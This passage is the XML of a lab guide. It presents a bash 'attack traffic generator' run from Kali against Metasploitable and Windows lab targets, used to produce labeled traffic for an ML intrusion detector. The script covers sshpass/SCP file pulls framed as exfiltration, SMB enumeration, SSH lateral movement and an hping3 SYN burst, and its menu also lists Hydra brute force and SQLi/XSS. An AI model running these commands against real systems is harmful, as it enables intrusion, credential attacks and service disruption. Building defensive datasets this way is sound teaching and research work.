          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[*] File: $EXFIL_FILE"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[*] This is a harmless sample file for ML traffic labeling."</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 Upload mode: Kali sends a harmless sample file to the target.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    # This still creates SCP file-transfer traffic for the ML pipeline.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    sshpass -p "$META_PASS" scp -o StrictHostKeyChecking=no "$EXFIL_FILE" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        "$META_USER@$META_IP:/tmp/exfil-test-$(timestamp).txt" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        &gt; "$LOG_DIR/exfil_scp_upload_meta_$(timestamp).log"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 Pull mode: Kali pulls a harmless file from the target.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    # This better represents exfiltration direction when the target account is authorized.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    sshpass -p "$META_PASS" ssh -o StrictHostKeyChecking=no "$META_USER@$META_IP" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        "echo 'Harmless victim-side sample for exfil simulation' &gt; /tmp/victim-side-sample.txt" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        &gt; "$LOG_DIR/exfil_prepare_remote_file_$(timestamp).log"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sshpass -p "$META_PASS" scp -o StrictHostKeyChecking=no \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        "$META_USER@$META_IP:/tmp/victim-side-sample.txt" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        "./exfil/pulled-from-target-$(timestamp).txt" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        &gt; "$LOG_DIR/exfil_scp_pull_meta_$(timestamp).log"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"Exfiltration" "Completed SCP transfer simulation" "$META_IP" "SCP file movement completed"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[+] Exfiltration simulation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8. LATERAL MOVEMENT SIMULATION</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lateral_movement() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    banner "CLASS: LATERAL MOVEMENT"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    log_label "Lateral Movement" "Start SMB enumeration" "$WINDOWS_IP" "SMB share discovery"</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Simulating SMB enumeration against Windows target..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    smbclient -L "//$WINDOWS_IP/" -N \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        &gt; "$LOG_DIR/lateral_smb_enum_windows_$(timestamp).log"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"Lateral Movement" "Start SSH internal movement simulation" "$META_IP" "SSH host-to-host style activity"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[*] Simulating internal SSH movement to Metasploitable..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    sshpass -p "$META_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        "$META_USER@$META_IP" "hostname; ip addr | head" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        &gt; "$LOG_DIR/lateral_ssh_meta_$(timestamp).log"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"Lateral Movement" "Completed lateral movement simulation" "Multiple" "SMB and SSH movement completed"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[+] Lateral movement simulation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9. CONTROLLED DOS-LIKE TRAFFIC</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dos_simulation() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    banner "CLASS: CONTROLLED DOS-LIKE TRAFFIC"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    log_label "DoS" "Start controlled SYN burst" "$META_IP" "Low-count hping3 SYN burst"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echo "[!] This is a controlled lab-only SYN burst."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[!] Keep this low-rate. The goal is traffic generation, not disruption."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[!] Packet count is intentionally limited to 100."</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sudo hping3 -S "$META_IP" -p 80 -c 100 --fast \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        &gt; "$LOG_DIR/dos_syn_burst_meta_$(timestamp).log" 2&gt;&amp;1</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log_label "DoS" "Completed controlled SYN burst" "$META_IP" "100 SYN packets sent"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[+] Controlled DoS-like traffic completed."</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10. RUN ALL</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run_all() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    banner "RUNNING FULL ATTACK TRAFFIC DEMO"</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normal_traffic</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recon_scan</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ssh_bruteforce</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web_attack</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exfiltration_simulation</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lateral_movement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    pause_between_attacks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dos_simulation</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banner "FULL DEMO COMPLETED"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[*] Label log saved to: $LABEL_LOG"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[*] Tool logs saved in: $LOG_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>}</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w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 11. MAIN MENU</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># -----------------------------</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init_files</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>safety_check</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>check_tools</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while true; do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "AI Network Manager - Attack Traffic Generator"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "------------------------------------------------"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "1. Generate Normal Traffic"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "2. Reconnaissance: Nmap + Ping Sweep"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "3. Brute Force: Hydra SSH"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "4. Web Attack: SQLi + XSS"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "5. Exfiltration: SCP Transfer"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "6. Lateral Movement: SMB + SSH"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "7. Controlled DoS-like SYN Burst"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "8. Run Full Demo"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "9. Exit"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "------------------------------------------------"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    read -p "Select option: " choice</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    case $choice in</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        1) normal_traffic ;;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        2) recon_scan ;;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        3) ssh_bruteforce ;;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        4) web_attack ;;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        5) exfiltration_simulation ;;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        6) lateral_movement ;;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        7) dos_simulation ;;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        8) run_all ;;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        9) echo "Exiting."; exit 0 ;;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        *) echo "Invalid option." ;;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    esac</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>9. How to Run the Demonstration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>After saving the script, make it executable and run it from the project directory.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>chmod +x attack-demo.sh</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>./attack-demo.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Recommended professor demonstration flow:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. Start packet capture on the AI Manager using tcpdump, Wireshark, Zeek, or another capture method.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. Run option 1: Generate Normal Traffic.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. Wait for the class to complete and observe the label log entry.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. Run option 2: Reconnaissance.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>5. Run option 3: Brute Force.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>6. Run option 4: Web Attack.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>7. Run option 5: Exfiltration.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>8. Run option 6: Lateral Movement if time allows.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>9. Run option 7: Controlled DoS only if the lab is stable and isolated.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>10. Stop packet capture and save the PCAP/log files for the ML side of the project.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>10. Explanation of Each Attack Class</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.1 Normal Traffic</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Normal traffic gives the ML system a baseline. Without normal traffic, the model may learn that every event is malicious. The script generates DNS lookups, web requests, and a legitimate SSH login. This class should be captured before attacks so the dataset contains benign examples.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.2 Reconnaissance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Reconnaissance simulates host discovery and service enumeration. The script uses Nmap for ping sweep, SYN scan, and service version detection. This class should create patterns such as many destination ports, repeated probes, and host discovery traffic.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.3 Brute Force</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The brute-force class uses Hydra against SSH with a small wordlist. The goal is to create repeated login attempts that your future model can associate with credential attacks. The script uses a deliberately small password list because the objective is labeling and detection, not attacking real systems.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.4 Web Attack</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
